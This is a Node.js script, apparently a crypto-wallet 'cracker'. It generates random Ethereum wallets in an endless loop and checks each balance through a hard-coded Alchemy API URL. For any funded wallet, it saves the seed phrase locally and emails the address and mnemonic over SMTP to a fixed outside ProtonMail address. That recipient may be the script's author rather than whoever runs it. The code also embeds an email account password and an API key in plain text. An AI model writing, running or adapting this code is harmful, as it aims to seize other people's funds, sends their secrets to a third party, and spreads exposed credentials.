const ethers = require('ethers');
const nodemailer = require('nodemailer');
const fs = require('fs/promises');

const API_KEY = 'https://eth-mainnet.g.alchemy.com/v2/JCNCAmqFfaWQ9WQrW143reOVrnRg1YfY';
const provider = new ethers.providers.JsonRpcProvider(API_KEY);

async function sendEmail(wallet) {
  const transporter = nodemailer.createTransport({
    host: 'smtp.protonmail.com',
    port: 587,
    secure: false,
    auth: {
      user: 'ethsender@protonmail.com',
      pass: 'LubieChuje2137',
    },
  });

  const mailOptions = {
    from: 'ethsender@protonmail.com',
    to: 'crackedeth@proton.me',
    subject: 'New Ethereum wallet found!',
    text: `Address: ${wallet.address}\nMnemonic: ${wallet.mnemonic.phrase}`,
  };

  await transporter.sendMail(mailOptions);
  console.log('Email sent!');
}

async function main() {
  while (1) {
    const wallet = ethers.Wallet.createRandom();
    const mnemonic = wallet.mnemonic.phrase;
    const address = wallet.address;
    const balance = ethers.utils.formatEther(await provider.getBalance(wallet.address));
    console.log(`Balance: ${balance}`);

    if (balance !== '0.0') {
      let crackedData;

      try {
        const data = await fs.readFile('./cracked.json');
        crackedData = JSON.parse(data);
      } catch (err) {
        console.error(err);
        continue;
      }

      crackedData[address] = { mnemonic, balance };

      try {
        await fs.writeFile('./cracked.json', JSON.stringify(crackedData, null, 4), 'utf8');
        await sendEmail(wallet);
      } catch (err) {
        console.error(err);
        continue;
      }
    }
  }
}

main();
